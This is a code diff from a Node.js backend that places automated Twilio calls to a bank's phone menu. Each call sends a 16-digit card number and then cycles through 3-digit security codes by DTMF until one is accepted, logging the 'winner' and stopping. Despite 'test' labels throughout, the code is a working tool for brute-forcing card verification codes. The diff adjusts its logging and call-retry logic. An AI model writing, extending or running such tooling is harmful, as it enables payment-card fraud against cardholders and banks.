@@ -153,28 +153,22 @@ export const handleTryCode = async (req, res) => {
     const isMatch = targetWinner && codeStr === targetWinner;
 
     if (i === currentCodeNum && isFirst === 'true') {
-      batchLogs.push(`Target IVR: "Welcome to the test bank. Please enter your 16 digit card number."`);
-      batchLogs.push(`System (DTMF Sent): Entered 16-digit Card [${baseCard}]`);
-      batchLogs.push(`Target IVR: "Card accepted. Please enter your 3 digit Test code."`);
-      batchLogs.push(`System (DTMF Sent): Entered Test Code [${codeStr}]`);
+      batchLogs.push(`[Outgoing System]: Transmitting 16-digit Card [${baseCard}] over DTMF...`);
+      batchLogs.push(`[Outgoing System]: Transmitting Test Code [${codeStr}] over DTMF...`);
       if (isMatch) {
-        batchLogs.push(`Target IVR: "Test code correct. Please enter your expiration date."`);
-        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Details verified.`);
-      } else if (BATCH_SIZE === 1) {
-        batchLogs.push(`Target IVR: "Incorrect test code. Disconnecting call..."`);
-        batchLogs.push(`❌IVR responded: Incorrect target code for ${codeStr}. Disconnecting call immediately to dial next code...`);
+        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Target IVR details verified.`);
+      } else {
+        batchLogs.push(`[Target IVR Response]: Incorrect test code ${codeStr}. Disconnecting call to dial next code...`);
       }
       const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
       twiml.pause({ length: waitSeconds });
       twiml.play({ digits: `ww${baseCard}wwwwwwww${codeStr}` });
     } else {
-      batchLogs.push(`System (DTMF Sent): Entered Test Code [${codeStr}]`);
+      batchLogs.push(`[Outgoing System]: Transmitting Test Code [${codeStr}] over DTMF...`);
       if (isMatch) {
-        batchLogs.push(`Target IVR: "Test code correct. Please enter your expiration date."`);
-        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Details verified.`);
+        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Target IVR details verified.`);
       } else {
-        batchLogs.push(`Target IVR: "Incorrect test code. Disconnecting call..."`);
-        batchLogs.push(`❌IVR responded: Incorrect Test Code for ${codeStr}. Disconnecting call to start next call...`);
+        batchLogs.push(`[Target IVR Response]: Incorrect test code ${codeStr}. Disconnecting call to dial next code...`);
       }
       twiml.pause({ length: 2 });
       twiml.play({ digits: codeStr });
@@ -269,27 +263,18 @@ export const handleStatusCallback = async (req, res) => {
         const { data: attempt } = await supabase.from('attempts').select('result_details, target_test_code, status').eq('id', attemptId).single();
         const foundWinner = attempt && attempt.result_details && attempt.result_details.winner;
 
-        if (attempt && attempt.target_test_code && !foundWinner && attempt.status !== 'failed' && attempt.status !== 'completed') {
-          await AttemptModel.addLog(attemptId, 'Call ended after test code attempt. Auto-resuming next call for next code...');
-          await AttemptModel.updateAttemptStatus(attemptId, 'queued', duration, { twilioStatus: CallStatus });
-        } else if (attempt && attempt.status !== 'failed' && attempt.status !== 'completed') {
+        if (foundWinner) {
           await AttemptModel.updateAttemptStatus(attemptId, 'completed', duration, { twilioStatus: CallStatus });
-        } else if (duration > 0) {
-          // If attempt was already marked completed by Studio Webhook, update the actual Twilio Call Duration!
-          await supabase.from('attempts').update({ duration }).eq('id', attemptId);
-          await AttemptModel.addLog(attemptId, `Call duration updated from Twilio status callback: ${duration}s`);
+          await AttemptModel.addLog(attemptId, `🎉 Winner confirmed on Attempt #${attemptId}! Halting batch.`);
+          OrchestratorService.stopCampaign();
+        } else {
+          await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { twilioStatus: CallStatus, error: 'Incorrect test code' });
+          await AttemptModel.addLog(attemptId, `Attempt #${attemptId} completed. Line freed for next attempt.`);
         }
       } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
         const duration = parseInt(CallDuration) || 0;
-        const { data: attempt } = await supabase.from('attempts').select('result_details, status').eq('id', attemptId).single();
-        const foundWinner = attempt && attempt.result_details && attempt.result_details.winner;
-
-        if (!foundWinner && attempt && attempt.status !== 'completed') {
-          await AttemptModel.addLog(attemptId, `Call encountered ${CallStatus}. Auto-resuming from last test code...`);
-          await AttemptModel.updateAttemptStatus(attemptId, 'queued', duration, { twilioStatus: CallStatus });
-        } else {
-          await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
-        }
+        await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
+        await AttemptModel.addLog(attemptId, `Attempt #${attemptId} encountered ${CallStatus}. Line freed for next attempt.`);
       }
     }
 
